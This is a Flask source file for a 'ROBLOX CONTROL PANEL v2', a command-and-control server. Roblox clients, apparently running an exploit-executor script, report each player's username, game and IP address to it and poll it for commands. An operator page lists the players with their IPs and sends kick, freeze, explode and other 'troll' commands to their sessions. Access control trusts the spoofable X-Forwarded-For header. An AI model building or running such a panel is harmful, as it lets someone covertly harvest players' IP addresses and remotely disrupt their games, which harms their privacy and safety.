from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "change_me_2025"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
connected_players = {}
pending_kicks = {}
pending_commands = {}
command_history = []  # Nouvel historique des commandes

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def denied(e):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    return f'<h1 style="color:red;text-align:center;margin-top:20%">Accès refusé<br>Ton IP: <b>{ip}</b></h1>', 403

@app.before_request
def protect():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

# HTML du panel (avec tabs Players/History)
HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>ROBLOX PANEL v2</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
body{background:#0f0f1a;color:#fff;font-family:Arial;margin:0}
header{background:#1a1a2e;padding:15px;text-align:center;border-bottom:3px solid #00ffaa}
nav{display:flex;justify-content:center;gap:30px;margin:20px 0}
.tab{background:#16213e;padding:12px 25px;border-radius:8px;cursor:pointer;transition:.3s}
.tab.active{background:#00ffaa;color:#000;font-weight:bold}
.content{display:none;padding:20px}
.content.active{display:block}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:20px}
.card{background:#16213e;border-radius:12px;padding:20px;box-shadow:0 0 20px rgba(0,255,170,.2)}
.dot{width:12px;height:12px;border-radius:50%;background:#ff0066;display:inline-block;box-shadow:0 0 10px #ff0066}
.dot.online{background:#00ffaa;box-shadow:0 0 15px #00ffaa}
button{background:linear-gradient(45deg,#ff0066,#ff3399);border:none;color:#fff;padding:10px 15px;border-radius:8px;cursor:pointer;margin:5px}
button:hover{transform:scale(1.05)}
#history table{width:100%;border-collapse:collapse;margin-top:10px}
#history th, #history td{padding:10px;text-align:left;border-bottom:1px solid #333}
#history th{background:#1a1a2e}
</style>
</head>
<body>
<header><h1 style="color:#00ffaa;text-shadow:0 0 20px #00ffaa">ROBLOX CONTROL PANEL v2</h1></header>
<nav>
    <div class="tab active" onclick="openTab('players')">Players</div>
    <div class="tab" onclick="openTab('history')">History</div>
</nav>
<div id="players" class="content active">
    <h2 style="text-align:center">Players Online: <b id="online">0</b></h2>
    <div class="grid" id="playerList"></div>
</div>
<div id="history" class="content">
    <h2 style="text-align:center">Command History</h2>
    <div id="historyTable"><table><tr><th>Time</th><th>Player</th><th>Game</th><th>Command</th></tr></table></div>
</div>
<script>
const socket=io(); let currentKick=null;
function openTab(t){document.querySelectorAll('.tab').forEach(e=>e.classList.remove('active')); 
document.querySelectorAll('.content').forEach(e=>e.classList.remove('active'));
document.querySelector(`[onclick="openTab('${t}')"]`).classList.add('active');
document.getElementById(t).classList.add('active');}
function toast(m){const t=document.createElement('div');t.textContent=m;t.style.position='fixed';t.style.bottom='20px';t.style.right='20px';
t.style.background='#ff0066';t.style.color='#fff';t.style.padding='15px';t.style.borderRadius='10px';t.style.zIndex='9999';
document.body.appendChild(t);setTimeout(()=>t.remove(),4000);}
function kick(id){currentKick=id;document.getElementById('kickModal').style.display='flex';}
function send(cmd,id){fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},
body:JSON.stringify({userid:id,cmd:cmd})});toast(cmd.toUpperCase()+" sent");}
socket.on("update",d=>{
    document.getElementById("online").innerText=d.online;
    const list=document.getElementById("playerList"); list.innerHTML="";
    Object.entries(d.players).forEach(([id,p])=>{
        const card=document.createElement("div"); card.className="card";
        card.innerHTML=`<div><span class="dot ${p.online?"online":""}"></span> <b>${p.username}</b> (${id})</div>
        <small>Game: <b>${p.game||'Unknown'}</b><br>Executor: ${p.executor}<br>IP: ${p.ip}</small><hr>
        <button onclick="kick('${id}')">KICK</button>
        <button onclick="send('freeze','${id}')">FREEZE</button>
        <button onclick="send('spin','${id}')">SPIN</button>
        <button onclick="send('explode','${id}')">EXPLODE</button>
        <button onclick="send('rainbow','${id}')">RAINBOW</button>
        <button onclick="send('invisible','${id}')">INVISIBLE</button>`;
        list.appendChild(card);
    });
});
socket.on("history",h=>{
    const tbody=document.querySelector("#historyTable table");
    tbody.innerHTML="<tr><th>Time</th><th>Player</th><th>Game</th><th>Command</th></tr>";
    h.slice(-50).reverse().forEach(e=>{
        const tr=document.createElement("tr");
        tr.innerHTML=`<td>${e.time}</td><td>${e.user}</td><td>${e.game}</td><td><b>${e.cmd}</b></td>`;
        tbody.appendChild(tr);
    });
});
</script>
<div id="kickModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);justify-content:center;align-items:center;">
    <div style="background:#111;padding:30px;border-radius:15px;width:400px;text-align:center">
        <h2 style="color:#ff0066">Kick Player</h2>
        <input id="reason" placeholder="Reason" style="width:100%;padding:15px;margin:15px 0;background:#222;border:none;border-radius:10px;color:#fff">
        <button onclick="fetch('/kick',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:currentKick,reason:document.getElementById('reason').value||'Kicked'})});document.getElementById('kickModal').style.display='none';toast('Kick sent')" style="background:#ff0066">Confirm Kick</button>
        <button onclick="document.getElementById('kickModal').style.display='none'" style="background:#444;margin-left:10px">Cancel</button>
    </div>
</div>
</body></html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json() or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                connected_players[uid] = {
                    "username": d.get("username", "Unknown"),
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "game": d.get("game", "Unknown Game"),
                    "last": now,
                    "online": True
                }
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except:
            pass
        return jsonify({"ok": True})
    uid = str(request.args.get("userid", ""))
    if not uid:
        return jsonify({})
    if uid in pending_kicks:
        r = pending_kicks.pop(uid, "Kicked")
        command_history.append({
            "time": time.strftime("%H:%M:%S"),
            "user": connected_players.get(uid, {}).get("username", "?"),
            "game": connected_players.get(uid, {}).get("game", "?"),
            "cmd": "KICK: " + r
        })
        socketio.emit("history", command_history)
        return jsonify({"command": "kick", "reason": r})
    if uid in pending_commands:
        cmd = pending_commands.pop(uid)
        command_history.append({
            "time": time.strftime("%H:%M:%S"),
            "user": connected_players.get(uid, {}).get("username", "?"),
            "game": connected_players.get(uid, {}).get("game", "?"),
            "cmd": cmd.upper()
        })
        socketio.emit("history", command_history)
        return jsonify({"command": cmd})
    return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "No reason")
    pending_kicks[uid] = reason
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd:
        pending_commands[uid] = cmd
    return jsonify({"sent": True})

def broadcast():
    while True:
        now = time.time()
        online = 0
        remove = []
        for uid, p in list(connected_players.items()):
            if now - p["last"] > 30:
                remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]:
                    online += 1
        for uid in remove:
            del connected_players[uid]
        socketio.emit("update", {"players": connected_players, "online": online})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast)
    socketio.run(app, host="0.0.0.0", port=5000)
